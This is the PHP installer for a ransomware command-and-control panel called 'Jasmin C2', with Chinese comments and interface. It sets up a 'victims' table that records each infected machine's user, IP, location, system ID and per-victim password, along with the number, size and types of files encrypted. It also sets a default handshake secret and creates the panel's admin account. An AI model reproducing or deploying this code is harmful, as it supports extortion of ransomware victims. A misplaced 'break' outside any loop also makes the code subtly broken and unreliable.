<?php
/**
 * Jasmin Web安装引导 — 检测环境、配置数据库、创建管理员
 */
session_start();

// 如果已安装，跳转登录
if (file_exists(__DIR__ . '/.installed')) {
    header('Location: login.php');
    exit;
}

$step = intval($_GET['step'] ?? 1);
$error = '';
$success = '';

// 处理POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($step === 2) {
        // 测试数据库连接
        $host = trim($_POST['db_host'] ?? 'localhost');
        $port = trim($_POST['db_port'] ?? '3306');
        $name = trim($_POST['db_name'] ?? 'jasmin_db');
        $user = trim($_POST['db_user'] ?? '');
        $pass = $_POST['db_pass'] ?? '';
        $secret = trim($_POST['secret'] ?? 'jasmin@123');
        try {
            $dsn = "mysql:host={$host};port={$port};charset=utf8mb4";
            $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
            // 白名单验证DB名，防止SQL注入
            if (!preg_match('/^[a-zA-Z0-9_]+$/', $name)) {
                $error = '数据库名只能包含字母、数字、下划线'; break;
            }
            $pdo->exec("CREATE DATABASE IF NOT EXISTS `{$name}` DEFAULT CHARACTER SET utf8mb4");
            $pdo->exec("USE `{$name}`");
            // 建表
            $pdo->exec("CREATE TABLE IF NOT EXISTS `master` (
                `id` int AUTO_INCREMENT PRIMARY KEY,
                `admin` varchar(255) NOT NULL UNIQUE,
                `creds` varchar(255) NOT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
            $pdo->exec("CREATE TABLE IF NOT EXISTS `victims` (
                `id` int AUTO_INCREMENT PRIMARY KEY,
                `machine_name` varchar(255),
                `computer_user` varchar(255),
                `os` varchar(100),
                `date` varchar(100),
                `time` time,
                `ip` varchar(45),
                `location` varchar(255),
                `systemid` varchar(255),
                `password` varchar(255),
                `encrypted_count` int NOT NULL DEFAULT 0,
                `encrypted_size` bigint NOT NULL DEFAULT 0,
                `encrypted_types` text DEFAULT NULL,
                `encrypted_detail` text DEFAULT NULL,
                `created_at` timestamp DEFAULT CURRENT_TIMESTAMP,
                INDEX(`systemid`), INDEX(`ip`)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
            // 写.env
            $env = "DB_HOST={$host}\nDB_PORT={$port}\nDB_NAME={$name}\nDB_USER={$user}\nDB_PASS={$pass}\nHANDSHAKE_SECRET={$secret}\n";
            file_put_contents(__DIR__ . '/.env', $env);
            $_SESSION['install_db_ok'] = true;
            header('Location: install.php?step=3');
            exit;
        } catch (PDOException $e) {
            $error = '数据库连接失败: ' . $e->getMessage();
        }
    }
    elseif ($step === 3) {
        $admin_user = trim($_POST['admin_user'] ?? 'admin');
        $admin_pass = $_POST['admin_pass'] ?? '';
        $admin_pass2 = $_POST['admin_pass2'] ?? '';
        if (strlen($admin_pass) < 6) { $error = '密码至少6位'; }
        elseif ($admin_pass !== $admin_pass2) { $error = '两次密码不一致'; }
        else {
            require_once __DIR__ . '/database/db_conection.php';
            $hash = password_hash($admin_pass, PASSWORD_BCRYPT);
            $stmt = $pdo->prepare('DELETE FROM master WHERE admin = :u');
            $stmt->execute([':u' => $admin_user]);
            $stmt = $pdo->prepare('INSERT INTO master (admin, creds) VALUES (:u, :p)');
            $stmt->execute([':u' => $admin_user, ':p' => $hash]);
            file_put_contents(__DIR__ . '/.installed', date('Y-m-d H:i:s'));
            header('Location: install.php?step=4');
            exit;
        }
    }
}
function h($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
?>
<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Jasmin — 安装引导</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link rel="stylesheet" href="./assets/css/login-new.css">
<style>
.wrap{max-width:520px}.steps{display:flex;gap:4px;margin-bottom:24px}
.step{flex:1;height:4px;border-radius:2px;background:#1e293b}
.step.done{background:#10b981}.step.cur{background:#4dc3fa}
form{text-align:left}
.chk{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #1e293b;font-size:.85rem}
.chk .ok{color:#10b981}.chk .fail{color:#ef4444}
.field{margin-bottom:14px}.field label{display:block;font-size:.78rem;color:#94a3b8;margin-bottom:5px}
.field input{width:100%;padding:10px 14px;background:#0f172a;border:1px solid #1e293b;border-radius:8px;color:#e2e8f0;font-size:.88rem;outline:none}
.field input:focus{border-color:#4dc3fa}
.err{color:#f87171;font-size:.82rem;margin-bottom:12px}
.ok-msg{color:#10b981;font-size:.82rem;margin-bottom:12px}
.done-box{text-align:center;padding:20px 0}
.done-box i{font-size:3rem;color:#10b981;margin-bottom:12px;display:block}
.done-box a{color:#4dc3fa;text-decoration:underline}
</style>
</head>
<body>
<div class="wrap">
<form method="post" action="install.php?step=<?=$step?>">
<div class="logo"><i class="fas fa-skull-crossbones"></i></div>
<h1>JASMIN</h1>
<p class="subtitle">安装引导 — 步骤 <?=$step?>/4</p>
<div class="steps">
  <div class="step <?=$step>1?'done':($step==1?'cur':'')?>"></div>
  <div class="step <?=$step>2?'done':($step==2?'cur':'')?>"></div>
  <div class="step <?=$step>3?'done':($step==3?'cur':'')?>"></div>
  <div class="step <?=$step>3?'done':''?>"></div>
</div>
<?php if($error):?><div class="err"><i class="fas fa-exclamation-circle"></i> <?=h($error)?></div><?php endif;?>

<?php if($step === 1): ?>
<h3 style="color:#e2e8f0;margin-bottom:14px">环境检测</h3>
<?php
$checks = [
    'PHP >= 7.4' => version_compare(PHP_VERSION,'7.4.0','>='),
    'PDO MySQL' => extension_loaded('pdo_mysql'),
    'JSON' => extension_loaded('json'),
    'mbstring' => extension_loaded('mbstring'),
    'passwords/ 可写' => is_writable(__DIR__) || @mkdir(__DIR__.'/passwords'),
];
$all_ok = !in_array(false, $checks);
foreach($checks as $name=>$ok): ?>
<div class="chk"><span><?=$name?></span><span class="<?=$ok?'ok':'fail'?>"><i class="fas fa-<?=$ok?'check':'times'?>"></i></span></div>
<?php endforeach; ?>
<br>
<?php if($all_ok):?>
<a href="install.php?step=2"><button type="button" style="width:100%">下一步 →</button></a>
<?php else:?>
<p class="err">请先修复上述环境问题</p>
<?php endif;?>
<?php endif;?>

<?php if($step === 2): ?>
<h3 style="color:#e2e8f0;margin-bottom:14px">数据库配置</h3>
<div class="field"><label>数据库主机</label><input name="db_host" value="<?=file_exists('/.dockerenv')?'db':'localhost'?>" required></div>
<div class="field"><label>端口</label><input name="db_port" value="3306" required></div>
<div class="field"><label>数据库名</label><input name="db_name" value="jasmin_db" required></div>
<div class="field"><label>用户名</label><input name="db_user" value="" required></div>
<div class="field"><label>密码</label><input name="db_pass" type="password" value=""></div>
<div class="field"><label>握手密钥</label><input name="secret" value="jasmin@123" required></div>
<button type="submit" style="width:100%">测试连接并创建表 →</button>
<?php endif;?>

<?php if($step === 3): ?>
<h3 style="color:#e2e8f0;margin-bottom:14px">创建管理员</h3>
<div class="field"><label>管理员用户名</label><input name="admin_user" value="admin" required></div>
<div class="field"><label>密码</label><input name="admin_pass" type="password" required></div>
<div class="field"><label>确认密码</label><input name="admin_pass2" type="password" required></div>
<button type="submit" style="width:100%">完成安装 →</button>
<?php endif;?>

<?php if($step === 4): ?>
<div class="done-box">
  <i class="fas fa-check-circle"></i>
  <h3 style="color:#e2e8f0">安装完成!</h3>
  <p style="color:#94a3b8;margin:12px 0">Jasmin C2 已成功部署</p>
  <a href="login.php"><button type="button" style="width:100%">进入登录页 →</button></a>
</div>
<?php endif;?>

</form></div></body></html>

